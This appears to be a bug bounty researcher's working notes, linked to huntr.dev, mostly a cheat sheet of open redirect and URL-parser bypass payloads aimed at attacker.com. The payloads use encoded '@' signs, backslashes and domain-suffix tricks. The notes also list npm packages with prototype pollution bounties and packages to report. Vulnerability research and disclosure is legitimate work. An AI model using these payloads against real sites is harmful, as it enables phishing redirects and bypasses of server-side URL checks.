https://www.huntr.dev/users/ready-research

## Open Redirection

<center>scheme://userinfo@hostname:port/path?query#fragment</center>

- url parsers {also test for lfi like PHP}
- if you get wrong hostname then it is a open redirection.

Example:
Original Payload:	 `http://google.com`
Malicious Payload: `http://google.com# @secret.corp`
One more: 	`localhost:8080//example.com`
https://www.huntr.dev/bounties/1625731270940-tjenkinson/url-toolkit/
Payload: `http:/\github.com`
Payloads: `https://user:password:8080/github.com@attacker.com`
Payloads: `https://attacker.com/@example.com` 
*output:* attacker.com - hostname and example.com as user
<i>unless validator treats the blackslash as a path seperator</i>

Payloads: 
- `http://example.com%2f@attacker.com`
- `http://example.com%252f@attacker.com`
- `https://example.com%25252f@attacker.com`

==Vliadator doesnt double decodes but broswer does==
<center>`https://attacker.com%252f@example.com`</center>

The validator would see example.com as the hostname. But the browser

would redirect to attacker.com, because @example.com becomes the path por-
tion of the URL, like this:
`https://attacker.com/@example.com`

---------

<center>Chrome interprets these url to <i>https://attacker.com</i></center>

https:attacker.com
https;attacker.com
https:/\\/\attacker.com
https:\\/\\/attacker.com

<center>More modern browsers also automatically correct (\) <i>https://attacker.com</i></center>

https:\\\\example.com
https://example.com

**Falw in validator logic:**
URL validator often checks if the redirect
URL starts with, contains, or ends with the site’s domain name.
Bypass: http://example.com.attacker.com
			  http://attacker.com.example.com
			  
bypass: http://example.com@attacker.com/example.com

## Non ASCII characters
`https://attacker.com%ff.example.com`
sometimes broswer converts ASCII character to ? which turns out
`https://attacker.com?.example.com`


**Ultimate Payload:** `https://example.com%252f@attacker.com/example.com`
This URL bypasses protection that checks only that a URL contains,
starts with, or ends with an allowlisted hostname by making the URL
both start and end with example.com. Most browsers will interpret example
.com%252f as the username portion of the URL. But if the validator over-
decodes the URL, it will confuse example.com as the hostname portion
Turns out: https://example.com/@attacker.com/example.com




**Expected Output**:

```
protocols: ["http"]
protocol: "http"
port: null

resource: "google.com"

user: ""
pathname: ""
hash: ""
search: ""
href: "http://google.com"
query: Object {}
```

**Unexpected Output**:

```
protocol: "http"
port: null

resource: "secret.corp"

user: "google.com# "
pathname: ""
hash: ""
search: ""
href: "http://google.com# @secret.corp"
```

## Stored XSS
https://www.huntr.dev/bounties/1-npm-bizcharts/

## SSRF
## Prototype Pollution
https://www.huntr.dev/bounties/1-npm-cli-table/
https://www.huntr.dev/bounties/1-npm-propper/
https://www.huntr.dev/bounties/1-npm-js-data/
https://www.huntr.dev/bounties/1-npm-@indlekofer/object_set/
https://www.huntr.dev/bounties/1-npm-json-glat/
https://www.huntr.dev/bounties/1-npm-dset/
https://www.huntr.dev/bounties/1-npm-set-object-value/
https://www.huntr.dev/bounties/1-npm-arr-flatten-unflatten/
https://www.huntr.dev/bounties/1-npm-libnested/
https://www.huntr.dev/bounties/1-npm-obj-def/
https://www.huntr.dev/bounties/1-npm-set-or-get/
https://www.huntr.dev/bounties/1-npm-deep-override/
https://www.huntr.dev/bounties/1-npm-mout/
https://www.huntr.dev/bounties/1-npm-extra-object/
https://www.huntr.dev/bounties/1-npm-grpc/

Identify the common things in these packages.


## Code Injection
https://www.huntr.dev/bounties/1-npm-json/

## Improper input validation
Example: 
Original payload:	 `http://google.com`
Malicious payload: `http:/\google.com`

**Expected Output:**

```
protocol: "http"
port: null
resource: "google.com"
user: ""

pathname: ""

hash: ""
search: ""
href: "http://google.com"
```

**Unexpected Output:**

```
protocol: "ssh"
port: null
resource: "http"
user: ""

pathname: "/google.com"

hash: ""
search: ""
href: "http:/google.com"
```

Vulnerable packages to report:
- [x] https://runkit.com/x3rz/60e7abe9dcfea3001b34b965
- [x] in parse-url
- [ ] https://npm.runkit.com/url-parse `https://example.com@attacker.com`
- [ ] https://npm.runkit.com/git-url-parse
- [ ] https://www.npmjs.com/package/url-parse-lax
- [ ] https://npm.runkit.com/url
- [ ] 


## Path traversal 

